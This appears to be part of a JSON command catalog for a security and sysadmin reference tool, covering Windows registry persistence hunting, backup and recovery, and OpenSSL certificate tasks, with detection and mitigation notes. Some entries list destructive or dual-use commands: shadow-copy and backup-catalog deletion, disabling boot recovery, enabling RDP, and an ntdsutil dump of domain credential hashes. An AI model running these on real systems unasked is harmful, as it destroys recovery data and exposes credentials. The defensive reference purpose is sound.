 {"id":"reg-winlogon-persistence","level":"intermediate","requires":{"elevation":true},"updated":"2026-07","cat":"Windows Registry","title":"Inspect Winlogon Userinit / Shell","desc":"Check Winlogon Userinit and Shell values, a common logon-persistence hijack point.","team":"purple","danger":"AUTHORIZED USE ONLY. Appending a binary to Userinit/Shell runs it at every logon; modification requires Administrator.","attack":["T1547.004"],"detect":"Userinit not equal to 'C:\\Windows\\system32\\userinit.exe,' or Shell not equal to 'explorer.exe'; Sysmon Event ID 13 on the Winlogon key.","mitigate":"Lock the Winlogon key ACL, alert on any change to Userinit/Shell, and compare against a known-good baseline.","tags":["registry","windows","persistence","detection"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell"}},
 {"id":"reg-ifeo-debugger","level":"intermediate","requires":{"elevation":true},"updated":"2026-07","cat":"Windows Registry","title":"Hunt Image File Execution Options debuggers","desc":"Enumerate IFEO Debugger values that silently launch a process when a target .exe starts.","team":"purple","danger":"AUTHORIZED USE ONLY. A Debugger value hijacks execution of the named binary (and enables accessibility-tool bypass). Writing needs Administrator.","attack":["T1546.012"],"detect":"Unexpected Debugger values under Image File Execution Options; Sysmon Event ID 13; parent-process anomalies where a debugger spawns instead of the target.","mitigate":"Audit the IFEO key, alert on any Debugger value, and restrict who can write under HKLM\\...\\Image File Execution Options.","tags":["registry","windows","persistence","privesc"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" /s /f Debugger"}},
 {"id":"reg-appinit-dlls","level":"intermediate","requires":{"elevation":true},"updated":"2026-07","cat":"Windows Registry","title":"Check AppInit_DLLs","desc":"Read AppInit_DLLs and LoadAppInit_DLLs, a legacy DLL-injection-into-every-GUI-process vector.","team":"purple","danger":"AUTHORIZED USE ONLY. A populated AppInit_DLLs with LoadAppInit_DLLs=1 loads that DLL into most user32 processes. Writing needs Administrator.","attack":["T1546.010"],"detect":"Non-empty AppInit_DLLs; LoadAppInit_DLLs flipped to 1; Sysmon Event ID 13 on the Windows key and Event ID 7 (image loaded) for the injected DLL.","mitigate":"Keep Secure Boot on (AppInit is ignored when enabled), set LoadAppInit_DLLs=0, and alert on changes to the value.","tags":["registry","windows","persistence","detection"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v LoadAppInit_DLLs"}},
 {"id":"reg-services-persistence","level":"intermediate","requires":{"elevation":true},"updated":"2026-07","cat":"Windows Registry","title":"Review service registry entries","desc":"Inspect a service's ImagePath and Start type under CurrentControlSet\\Services for tampering.","team":"purple","danger":"AUTHORIZED USE ONLY. Editing ImagePath or Start (0/2 = auto) creates or hijacks a service for persistence/privesc; requires Administrator.","attack":["T1543.003"],"detect":"Security 4697/7045 (new service installed); Sysmon Event ID 13 on Services keys; ImagePath pointing at unusual paths, scripts, or unquoted paths with spaces.","mitigate":"Restrict service-config rights, alert on new/modified services, and validate binary signatures for auto-start services.","tags":["registry","windows","persistence","privesc"],"code":{"cmd":"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\{{SVC:Spooler}}\" /v ImagePath\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\{{SVC:Spooler}}\" /v Start"}},
 {"id":"reg-rdp-enable","level":"intermediate","requires":{"elevation":true},"updated":"2026-07","cat":"Windows Registry","title":"Enable Remote Desktop via registry","desc":"Flip fDenyTSConnections to 0 to allow inbound RDP (query is safe; the add enables it).","team":"purple","danger":"AUTHORIZED USE ONLY. Enabling RDP opens a remote-access surface; requires Administrator and a matching firewall rule. Common lateral-movement setup step.","attack":["T1021.001"],"detect":"Sysmon Event ID 13 on fDenyTSConnections; firewall rule changes; Security 4624 Type 10 (RemoteInteractive) logons after the change.","mitigate":"Keep RDP disabled where unused, gate it behind NLA + VPN/jump host, and alert on fDenyTSConnections flipping to 0.","tags":["registry","windows","remote","post-ex"],"code":{"cmd":"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"}},
 {"id":"reg-uac-settings","level":"intermediate","requires":{"elevation":true},"updated":"2026-07","cat":"Windows Registry","title":"Read / weaken UAC policy keys","desc":"Inspect EnableLUA and ConsentPromptBehaviorAdmin; setting EnableLUA=0 disables UAC entirely.","team":"purple","danger":"AUTHORIZED USE ONLY. Disabling UAC removes an integrity boundary and needs a reboot; requires Administrator. Query first, change only with approval.","attack":["T1548.002"],"detect":"Sysmon Event ID 13 on EnableLUA / ConsentPromptBehaviorAdmin; Security 4657; sudden absence of consent prompts across a fleet.","mitigate":"Enforce UAC via GPO, alert on EnableLUA=0 or ConsentPromptBehaviorAdmin=0, and block registry writes to the Policies\\System key.","tags":["registry","windows","privesc","detection"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v ConsentPromptBehaviorAdmin"}},
 {"id":"reg-defender-disable","level":"intermediate","updated":"2026-07","cat":"Windows Registry","title":"Detect Defender registry tampering","desc":"Check the Windows Defender policy keys attackers set to impair AV (DisableAntiSpyware, DisableRealtimeMonitoring).","team":"purple","danger":"AUTHORIZED USE ONLY. These policy values disable protection; modern Tamper Protection usually blocks the write. Query for hunting, do not disable production AV.","attack":["T1562.001"],"detect":"Non-zero DisableAntiSpyware / DisableRealtimeMonitoring; Defender Event ID 5001/5010 (protection disabled); Sysmon Event ID 13 on the Windows Defender key.","mitigate":"Enable Tamper Protection, manage Defender exclusively via GPO/Intune, and alert on any write to HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender.","tags":["registry","windows","detection","incident-response"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware\nreg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring"}},
 {"id":"reg-usbstor-history","level":"intermediate","cat":"Windows Registry","title":"USB storage device history","desc":"Enumerate USBSTOR to recover connected removable-drive vendors, models, and serials for forensics.","team":"blue","tags":["registry","windows","forensics","triage"],"code":{"cmd":"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\" /s","ps":"Get-ChildItem 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR' | Select-Object -ExpandProperty Name"}},
 {"id":"reg-userassist","level":"intermediate","cat":"Windows Registry","title":"UserAssist execution artifacts","desc":"List UserAssist entries (ROT13-encoded GUI program run counts and last-run times) per user.","team":"blue","tags":["registry","windows","forensics","timeline"],"code":{"cmd":"reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\" /s"}},
 {"id":"reg-hive-file-locations","level":"intermediate","cat":"Windows Registry","title":"Where the hive files live","desc":"Reference: system hives sit in System32\\config; each user's HKCU is NTUSER.DAT in their profile.","tags":["registry","windows","reference","forensics"],"code":{"cmd":"dir C:\\Windows\\System32\\config\ndir /a C:\\Users\\{{USER:you}}\\NTUSER.DAT","ps":"Get-ChildItem C:\\Windows\\System32\\config -Filter '*' | Where-Object { $_.Name -in 'SYSTEM','SOFTWARE','SAM','SECURITY','DEFAULT' }"}},
 {"id":"reg-key-acl","level":"intermediate","cat":"Windows Registry","title":"Inspect a key's permissions","desc":"Show the ACL on a registry key to spot weak permissions that allow persistence or privesc.","team":"blue","tags":["registry","windows","privesc","detection"],"code":{"ps":"Get-Acl 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\{{SVC:Spooler}}' | Format-List"}},

/* ================= BACKUP & RECOVERY ================= */
 {"id":"bak-win-restore-point-create","level":"beginner","requires":{"elevation":true},"cat":"Backup & Recovery","title":"Create a System Restore point","desc":"Create a Windows client restore point (Windows PowerShell 5.1; System Protection must be enabled).","danger":"Requires admin. Throttled to one auto point per 24h by default; consumes shadow storage.","tags":["backup","windows","quick-win"],"code":{"ps":"Checkpoint-Computer -Description \"{{DESC:Manual checkpoint}}\" -RestorePointType MODIFY_SETTINGS"}},
 {"id":"bak-win-restore-point-list","level":"beginner","cat":"Backup & Recovery","title":"List System Restore points","desc":"Enumerate existing restore points with sequence numbers and timestamps (Windows PowerShell 5.1).","tags":["backup","windows","recovery"],"code":{"ps":"Get-ComputerRestorePoint | Format-Table SequenceNumber, Description, CreationTime -AutoSize"}},
 {"id":"bak-win-restore-point-revert","level":"beginner","requires":{"elevation":true},"cat":"Backup & Recovery","title":"Revert to a System Restore point","desc":"Roll system files/registry back to a restore point by sequence number (Windows PowerShell 5.1).","danger":"Requires admin and reboots the machine; reverts system state. Confirm the sequence number first.","tags":["recovery","windows"],"code":{"ps":"Restore-Computer -RestorePoint {{SEQ:1}}"}},
 {"id":"bak-win-wbadmin-backup","level":"beginner","requires":{"elevation":true},"cat":"Backup & Recovery","title":"Back up volumes with wbadmin","desc":"Create a bare-metal-capable backup of all critical volumes to a target disk with wbadmin.","danger":"Requires admin. Target volume contents may be overwritten; -quiet suppresses prompts.","tags":["backup","windows"],"code":{"cmd":"wbadmin start backup -backupTarget:{{DEST:E:}} -include:C: -allCritical -quiet"}},
 {"id":"bak-win-wbadmin-systemstate","level":"beginner","requires":{"elevation":true},"cat":"Backup & Recovery","title":"Back up system state (registry/AD)","desc":"Capture system state (registry, boot files, and AD/SYSVOL on a DC) with wbadmin.","danger":"Requires admin. On a domain controller this includes the AD database; store securely.","tags":["backup","windows","active-directory"],"code":{"cmd":"wbadmin start systemstatebackup -backupTarget:{{DEST:E:}} -quiet"}},
 {"id":"bak-win-inhibit-recovery","level":"beginner","cat":"Backup & Recovery","title":"Inhibit system recovery (ransomware precursor)","desc":"Catalog of native commands ransomware runs to delete shadow copies/backups and disable recovery.","danger":"Authorized IR/testing only. These commands destroy all local restore capability.","team":"blue","attack":["T1490"],"detect":"Process creation (Security 4688 / Sysmon 1) for vssadmin/wbadmin/bcdedit with delete/resize args; Windows Backup event 524 (catalog deleted); sudden shadow-storage drop.","mitigate":"Restrict local admin, keep immutable/off-host or air-gapped backups, enable EDR tamper protection, and alert on any 'vssadmin delete' or 'wbadmin delete'.","tags":["backup","windows","detection"],"code":{"cmd":"vssadmin delete shadows /all /quiet\nwbadmin delete catalog -quiet\nbcdedit /set {default} recoveryenabled no\nbcdedit /set {default} bootstatuspolicy ignoreallfailures"}},
 {"id":"bak-win-vss-create","level":"beginner","requires":{"elevation":true},"cat":"Backup & Recovery","title":"Create a Volume Shadow Copy","desc":"Make a client-accessible VSS snapshot of C: for point-in-time file recovery (client OS supported).","danger":"Requires admin. Consumes shadow storage; old copies may be aged out under space pressure.","tags":["backup","windows","forensics"],"code":{"ps":"(Get-WmiObject -List Win32_ShadowCopy).Create('C:\\','ClientAccessible')"}},
 {"id":"bak-win-vss-mount","level":"beginner","requires":{"elevation":true},"cat":"Backup & Recovery","title":"List and browse shadow copies","desc":"List shadow copies, then symlink one's device path to a folder to recover previous file versions.","danger":"Requires admin. Note the trailing backslash on the GLOBALROOT path or the symlink fails.","tags":["recovery","windows","forensics"],"code":{"cmd":"vssadmin list shadows\nmklink /d C:\\shadowmnt \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy{{ID:1}}\\\""}},
 {"id":"bak-win-ntds-ifm","level":"beginner","cat":"Backup & Recovery","title":"AD backup via ntdsutil IFM (dual-use)","desc":"ntdsutil Install-From-Media snapshots NTDS.dit + SYSTEM hive; the same technique is abused for credential theft.","danger":"Authorized DC backup/red-team only. Output contains every domain credential hash; treat as Tier-0 secret.","team":"blue","attack":["T1003.003"],"detect":"ntdsutil.exe / vssadmin on a DC (Sysmon 1, Security 4688); shadow copy creation on a DC; new ntds.dit copies (Sysmon 11) outside a backup window.","mitigate":"Limit DC logon to Tier-0 admins, enable Credential Guard, monitor VSS and ntdsutil on DCs, and alert on 'ifm' / 'create full'.","tags":["active-directory","windows","password"],"code":{"cmd":"ntdsutil \"activate instance ntds\" \"ifm\" \"create full {{DEST:C:\\ADBackup}}\" quit quit"}},
 {"id":"bak-mac-timemachine-info","level":"beginner","cat":"Backup & Recovery","title":"Time Machine status and backups","desc":"Show configured destinations, the latest backup, and all available backups with tmutil.","tags":["backup","macos","recovery"],"code":{"mac":"tmutil destinationinfo\ntmutil latestbackup\ntmutil listbackups"}},
 {"id":"bak-mac-timemachine-start","level":"beginner","requires":{"elevation":true},"cat":"Backup & Recovery","title":"Run a Time Machine backup now","desc":"Trigger an immediate Time Machine backup and block until it completes with tmutil.","danger":"Requires sudo. Time Machine must already have a configured destination.","tags":["backup","macos"],"code":{"mac":"sudo tmutil startbackup --block"}},
 {"id":"bak-mac-localsnapshot","level":"beginner","requires":{"elevation":true},"cat":"Backup & Recovery","title":"APFS local Time Machine snapshots","desc":"Create, list, and delete on-disk APFS local snapshots used by Time Machine with tmutil.","danger":"Deleting snapshots (sudo) permanently removes those point-in-time recovery points.","tags":["backup","macos","forensics"],"code":{"mac":"tmutil localsnapshot\ntmutil listlocalsnapshots /\nsudo tmutil deletelocalsnapshots {{DATE:2026-07-02-000000}}"}},
 {"id":"bak-rsync-mirror","level":"beginner","cat":"Backup & Recovery","title":"Incremental mirror backup with rsync","desc":"Mirror a tree preserving permissions, ACLs, and extended attributes; only changed data is copied.","danger":"--delete removes files at the destination that no longer exist in the source. Verify paths first.","tags":["backup","cross-platform","file-transfer"],"code":{"linux":"rsync -aAXv --delete {{SRC:/home/user/}} {{DEST:/mnt/backup/}}","mac":"rsync -aAXv --delete {{SRC:/Users/me/}} {{DEST:/Volumes/backup/}}"}},
 {"id":"bak-tar-archive","level":"beginner","cat":"Backup & Recovery","title":"Create a compressed tar archive","desc":"Archive a directory to a gzip-compressed tarball, preserving permissions (BSD and GNU tar).","tags":["backup","linux","macos"],"code":{"linux":"tar -czpvf {{OUT:backup.tar.gz}} {{SRC:/etc}}","mac":"tar -czpvf {{OUT:backup.tar.gz}} {{SRC:/etc}}"}},
 {"id":"bak-tar-restore","level":"beginner","cat":"Backup & Recovery","title":"Restore from a tar archive","desc":"Extract a gzip tarball into a target directory, restoring stored permissions.","danger":"Extracting with -C to a live path (e.g. /) overwrites existing files. Inspect with -tzf first.","tags":["recovery","linux","macos"],"code":{"linux":"tar -xzpvf {{ARCHIVE:backup.tar.gz}} -C {{DEST:/restore}}","mac":"tar -xzpvf {{ARCHIVE:backup.tar.gz}} -C {{DEST:/restore}}"}},
 {"id":"bak-dd-image","level":"beginner","requires":{"elevation":true},"cat":"Backup & Recovery","title":"Raw disk image with dd","desc":"Clone a whole block device to a raw image for forensic or full-disk backup.","danger":"Requires sudo. A wrong of= target irreversibly overwrites a disk. Confirm device names carefully.","tags":["backup","forensics","recovery"],"code":{"linux":"sudo dd if={{DEV:/dev/sdb}} of={{OUT:disk.img}} bs=4M conv=noerror,sync status=progress","mac":"sudo dd if={{DEV:/dev/disk2}} of={{OUT:disk.img}} bs=4m  # press Ctrl-T for progress"}},
 {"id":"bak-lvm-snapshot","level":"beginner","requires":{"elevation":true},"cat":"Backup & Recovery","title":"LVM snapshot for consistent backup","desc":"Create a copy-on-write LVM snapshot to back up a volume at a consistent point in time (Linux).","danger":"Requires sudo. Snapshot fills as origin changes; if it runs out of space it becomes invalid.","tags":["backup","linux"],"code":{"linux":"sudo lvcreate -L {{SIZE:2G}} -s -n {{NAME:snap0}} {{LV:/dev/vg0/root}}"}},
 {"id":"bak-borg","level":"beginner","cat":"Backup & Recovery","title":"Deduplicated encrypted backups (Borg)","desc":"Initialize an encrypted repo and create a dedup/compressed archive with BorgBackup (install borgbackup).","danger":"Store the repokey passphrase safely; losing it makes an encrypted repo unrecoverable.","tags":["backup","tools","cross-platform"],"code":{"linux":"borg init --encryption=repokey {{REPO:/mnt/borg}}\nborg create {{REPO:/mnt/borg}}::backup-{{DATE:2026-07-02}} {{SRC:/home}}","mac":"borg init --encryption=repokey {{REPO:/Volumes/borg}}\nborg create {{REPO:/Volumes/borg}}::backup-{{DATE:2026-07-02}} {{SRC:/Users}}"}},
 {"id":"bak-restic","level":"beginner","cat":"Backup & Recovery","title":"Fast encrypted snapshots (restic)","desc":"Initialize an encrypted repository and snapshot a directory with restic (install restic).","danger":"The repository password is required to restore; there is no recovery if it is lost.","tags":["backup","tools","cross-platform"],"code":{"linux":"restic init --repo {{REPO:/mnt/restic}}\nrestic -r {{REPO:/mnt/restic}} backup {{SRC:/home}}","mac":"restic init --repo {{REPO:/Volumes/restic}}\nrestic -r {{REPO:/Volumes/restic}} backup {{SRC:/Users}}","ps":"restic init --repo {{REPO:E:\\restic}}\nrestic -r {{REPO:E:\\restic}} backup {{SRC:C:\\Users}}"}},
 {"id":"bak-testdisk","level":"beginner","requires":{"elevation":true},"cat":"Backup & Recovery","title":"Recover lost partitions (TestDisk)","desc":"Rebuild partition tables and repair boot sectors interactively with TestDisk (install testdisk).","danger":"Requires sudo. Writing a rebuilt partition table can worsen data loss; work on an image copy when possible.","tags":["recovery","forensics","tools"],"code":{"linux":"sudo testdisk {{IMAGE_OR_DEV:/dev/sdb}}","mac":"sudo testdisk {{DEV:/dev/disk2}}"}},
 {"id":"bak-photorec","level":"beginner","requires":{"elevation":true},"cat":"Backup & Recovery","title":"Carve deleted files (PhotoRec)","desc":"Signature-based file carving to recover deleted files from a disk or image with PhotoRec (install testdisk).","danger":"Requires sudo. Always recover to a different disk than the source to avoid overwriting evidence.","tags":["recovery","forensics","tools"],"code":{"linux":"sudo photorec {{DEV:/dev/sdb}}","mac":"sudo photorec {{DEV:/dev/disk2}}"}},
 {"id":"bak-win-bitlocker-key","level":"beginner","requires":{"elevation":true},"cat":"Backup & Recovery","title":"Retrieve BitLocker recovery key","desc":"Display BitLocker protectors and the 48-digit recovery password before re-imaging (Windows).","danger":"Requires admin. Exposes the recovery key that unlocks the drive; handle and store securely.","tags":["recovery","windows","password"],"code":{"ps":"(Get-BitLockerVolume -MountPoint 'C:').KeyProtector | Format-List KeyProtectorType, RecoveryPassword","cmd":"manage-bde -protectors -get C:"}},
 {"id":"bak-mac-filevault-key","level":"beginner","requires":{"elevation":true},"cat":"Backup & Recovery","title":"Check FileVault status and recovery key","desc":"Show FileVault encryption status and whether a personal recovery key exists with fdesetup (macOS).","danger":"Requires sudo. Confirm a recovery key exists before disabling/rotating credentials to avoid lockout.","tags":["recovery","macos","password"],"code":{"mac":"fdesetup status\nsudo fdesetup haspersonalrecoverykey"}},
 {"id":"bak-checksum-verify","level":"beginner","cat":"Backup & Recovery","title":"Verify backup integrity with SHA-256","desc":"Hash a backup and verify it against a stored checksum to detect corruption or tampering.","tags":["backup","cross-platform","quick-win"],"code":{"linux":"sha256sum {{FILE:backup.tar.gz}} > sums.txt\nsha256sum -c sums.txt","mac":"shasum -a 256 {{FILE:backup.tar.gz}} > sums.txt\nshasum -a 256 -c sums.txt","ps":"Get-FileHash {{FILE:backup.tar.gz}} -Algorithm SHA256","cmd":"certutil -hashfile {{FILE:backup.tar.gz}} SHA256"}},

/* ================= CERTIFICATES & TLS ================= */
 {"id":"crt-inspect-cert","level":"intermediate","related":["crt-subject-issuer","crt-san-check","crt-check-expiry"],"cat":"Certificates & TLS","title":"Inspect an X.509 certificate file","desc":"Dump the full human-readable contents of a PEM/DER certificate.","tags":["certificates","tls","reference"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -text","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -text","cmd":"certutil -dump {{FILE:cert.cer}}","ps":"Get-PfxCertificate {{FILE:cert.cer}} | Format-List *","py":"python3 -c \"import ssl;print(ssl._ssl._test_decode_cert('{{FILE:cert.pem}}'))\""}},
 {"id":"crt-subject-issuer","level":"intermediate","cat":"Certificates & TLS","title":"Show certificate subject, issuer and dates","desc":"Quick one-line summary of who a cert is for, who signed it, and validity window.","tags":["certificates","tls","quick-win"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -subject -issuer -dates","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -subject -issuer -dates","ps":"$c=Get-PfxCertificate {{FILE:cert.cer}}; $c | Format-List Subject,Issuer,NotBefore,NotAfter"}},
 {"id":"crt-check-expiry","level":"intermediate","cat":"Certificates & TLS","title":"Check certificate expiry date","desc":"Print the notAfter date of a certificate file.","tags":["certificates","tls","quick-win"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -enddate","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -enddate","ps":"(Get-PfxCertificate {{FILE:cert.cer}}).NotAfter","py":"python3 -c \"import ssl;print(ssl._ssl._test_decode_cert('{{FILE:cert.pem}}')['notAfter'])\""}},
 {"id":"crt-checkend","level":"intermediate","cat":"Certificates & TLS","title":"Test if a cert expires within N seconds","desc":"Scriptable check: exit 0 if the cert is still valid past the window, 1 if it will expire.","tags":["certificates","tls","automation"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -checkend {{SECONDS:604800}}; echo \"expiring=$?\"","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -checkend {{SECONDS:604800}}; echo \"expiring=$?\""}},
 {"id":"crt-fingerprint","level":"intermediate","cat":"Certificates & TLS","title":"Compute a certificate fingerprint","desc":"SHA-256 fingerprint of a cert for pinning/comparison (Windows Thumbprint is SHA-1).","tags":["certificates","tls","detection"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -fingerprint -sha256","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -fingerprint -sha256","ps":"(Get-PfxCertificate {{FILE:cert.cer}}).Thumbprint"}},
 {"id":"crt-san-check","level":"intermediate","cat":"Certificates & TLS","title":"List Subject Alternative Names (SAN)","desc":"Show the DNS/IP names a cert actually covers — modern clients ignore CN.","tags":["certificates","tls","enumeration"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -noout -ext subjectAltName","linux":"openssl x509 -in {{FILE:cert.pem}} -noout -ext subjectAltName"}},
 {"id":"crt-gen-key","level":"intermediate","related":["crt-gen-csr","crt-gen-selfsigned"],"cat":"Certificates & TLS","title":"Generate a private key (RSA or EC)","desc":"Create an unencrypted RSA-2048 or P-256 EC private key.","danger":"Writes a private key to disk unencrypted; protect the file and never commit it.","tags":["certificates","tls"],"code":{"mac":"openssl genrsa -out {{KEY:key.pem}} 2048   # EC: openssl ecparam -name prime256v1 -genkey -noout -out {{KEY:key.pem}}","linux":"openssl genrsa -out {{KEY:key.pem}} 2048   # EC: openssl ecparam -name prime256v1 -genkey -noout -out {{KEY:key.pem}}"}},
 {"id":"crt-gen-csr","level":"intermediate","related":["crt-gen-selfsigned","crt-view-csr"],"cat":"Certificates & TLS","title":"Generate a CSR and key","desc":"Create a certificate signing request plus a new key to send to a CA.","danger":"Writes a new private key; keep it secret and submit only the .csr to the CA.","tags":["certificates","tls"],"code":{"mac":"openssl req -new -newkey rsa:2048 -nodes -keyout {{KEY:key.pem}} -out {{CSR:req.csr}} -subj \"/CN={{CN:example.com}}\"","linux":"openssl req -new -newkey rsa:2048 -nodes -keyout {{KEY:key.pem}} -out {{CSR:req.csr}} -subj \"/CN={{CN:example.com}}\""}},
 {"id":"crt-gen-selfsigned","level":"intermediate","related":["crt-inspect-cert","crt-key-cert-match"],"cat":"Certificates & TLS","title":"Generate a self-signed certificate","desc":"Create a key + self-signed cert with a SAN for local testing/labs.","danger":"For test/lab use only; self-signed certs are not trusted by clients. Writes key + cert to disk.","tags":["certificates","tls"],"code":{"mac":"openssl req -x509 -newkey rsa:2048 -nodes -keyout {{KEY:key.pem}} -out {{CERT:cert.pem}} -days {{DAYS:365}} -subj \"/CN={{CN:example.com}}\" -addext \"subjectAltName=DNS:{{CN:example.com}}\"","linux":"openssl req -x509 -newkey rsa:2048 -nodes -keyout {{KEY:key.pem}} -out {{CERT:cert.pem}} -days {{DAYS:365}} -subj \"/CN={{CN:example.com}}\" -addext \"subjectAltName=DNS:{{CN:example.com}}\"","ps":"New-SelfSignedCertificate -DnsName {{CN:example.com}} -CertStoreLocation Cert:\\CurrentUser\\My"}},
 {"id":"crt-verify-chain","level":"intermediate","cat":"Certificates & TLS","title":"Verify a certificate against a CA chain","desc":"Validate a leaf cert, supplying intermediates with -untrusted if needed.","tags":["certificates","tls","detection"],"code":{"mac":"openssl verify -CAfile {{CA:ca.pem}} -untrusted {{CHAIN:intermediates.pem}} {{CERT:cert.pem}}","linux":"openssl verify -CAfile {{CA:ca.pem}} -untrusted {{CHAIN:intermediates.pem}} {{CERT:cert.pem}}","cmd":"certutil -verify -urlfetch {{CERT:cert.cer}}"}},
 {"id":"crt-s-client-connect","level":"intermediate","related":["crt-get-server-cert","crt-tls-version-enum"],"cat":"Certificates & TLS","title":"TLS handshake with a server (s_client)","desc":"Open a TLS connection and view the negotiated protocol, cipher and presented cert.","tags":["tls","network","banner"],"code":{"mac":"openssl s_client -connect {{HOST:example.com}}:{{PORT:443}} -servername {{HOST:example.com}} </dev/null","linux":"openssl s_client -connect {{HOST:example.com}}:{{PORT:443}} -servername {{HOST:example.com}} </dev/null"}},
 {"id":"crt-s-client-showcerts","level":"intermediate","cat":"Certificates & TLS","title":"Dump the full chain a server sends","desc":"Show every certificate the server presents to diagnose missing intermediates.","tags":["tls","network","enumeration"],"code":{"mac":"openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} -showcerts </dev/null","linux":"openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} -showcerts </dev/null"}},
 {"id":"crt-remote-expiry","level":"intermediate","cat":"Certificates & TLS","title":"Check a live server's cert expiry","desc":"Fetch the leaf cert over TLS and print its expiry without saving it.","tags":["tls","network","quick-win"],"code":{"mac":"echo | openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} 2>/dev/null | openssl x509 -noout -enddate","linux":"echo | openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} 2>/dev/null | openssl x509 -noout -enddate","ps":"$h='{{HOST:example.com}}';$c=[Net.Sockets.TcpClient]::new($h,443);$s=[Net.Security.SslStream]::new($c.GetStream());$s.AuthenticateAsClient($h);([Security.Cryptography.X509Certificates.X509Certificate2]$s.RemoteCertificate).NotAfter;$s.Dispose();$c.Dispose()","py":"python3 -c \"import ssl,socket;ctx=ssl.create_default_context();s=ctx.wrap_socket(socket.socket(),server_hostname='{{HOST:example.com}}');s.connect(('{{HOST:example.com}}',443));print(s.getpeercert()['notAfter'])\""}},
 {"id":"crt-get-server-cert","level":"intermediate","cat":"Certificates & TLS","title":"Save a server's certificate to a file","desc":"Retrieve the leaf certificate in PEM form for offline inspection.","tags":["tls","network","recon"],"code":{"mac":"openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} </dev/null 2>/dev/null | openssl x509 -out {{OUT:server.pem}}","linux":"openssl s_client -connect {{HOST:example.com}}:443 -servername {{HOST:example.com}} </dev/null 2>/dev/null | openssl x509 -out {{OUT:server.pem}}","py":"python3 -c \"import ssl;open('{{OUT:server.pem}}','w').write(ssl.get_server_certificate(('{{HOST:example.com}}',443)))\""}},
 {"id":"crt-convert-pem-der","level":"intermediate","cat":"Certificates & TLS","title":"Convert between PEM and DER","desc":"Swap a certificate between base64 PEM (.pem/.crt) and binary DER (.der/.cer).","tags":["certificates","tls"],"code":{"mac":"openssl x509 -in {{FILE:cert.pem}} -outform DER -out cert.der   # DER->PEM: openssl x509 -inform DER -in cert.der -out cert.pem","linux":"openssl x509 -in {{FILE:cert.pem}} -outform DER -out cert.der   # DER->PEM: openssl x509 -inform DER -in cert.der -out cert.pem","cmd":"certutil -decode {{FILE:cert.pem}} cert.der   :: DER->PEM: certutil -encode cert.der cert.pem"}},
 {"id":"crt-pfx-extract","level":"intermediate","cat":"Certificates & TLS","title":"Extract cert and key from a PFX/PKCS12","desc":"Pull the certificate and private key out of a .pfx/.p12 bundle into PEM.","danger":"Outputs the private key unencrypted (-nodes); handle the resulting PEM securely.","tags":["certificates","tls"],"code":{"mac":"openssl pkcs12 -in {{FILE:bundle.pfx}} -nodes -out out.pem   # add -passin pass:{{PW}} to avoid prompt","linux":"openssl pkcs12 -in {{FILE:bundle.pfx}} -nodes -out out.pem   # add -passin pass:{{PW}} to avoid prompt","ps":"Get-PfxData -FilePath {{FILE:bundle.pfx}} -Password (Read-Host -AsSecureString)"}},
 {"id":"crt-create-pfx","level":"intermediate","cat":"Certificates & TLS","title":"Bundle cert + key into a PFX","desc":"Package a certificate and its key into a password-protected PKCS12 file.","danger":"Creates a file containing the private key; set a strong export password and protect it.","tags":["certificates","tls"],"code":{"mac":"openssl pkcs12 -export -in {{CERT:cert.pem}} -inkey {{KEY:key.pem}} -out bundle.pfx","linux":"openssl pkcs12 -export -in {{CERT:cert.pem}} -inkey {{KEY:key.pem}} -out bundle.pfx","ps":"Export-PfxCertificate -Cert Cert:\\CurrentUser\\My\\{{THUMBPRINT}} -FilePath bundle.pfx -Password (Read-Host -AsSecureString)"}},
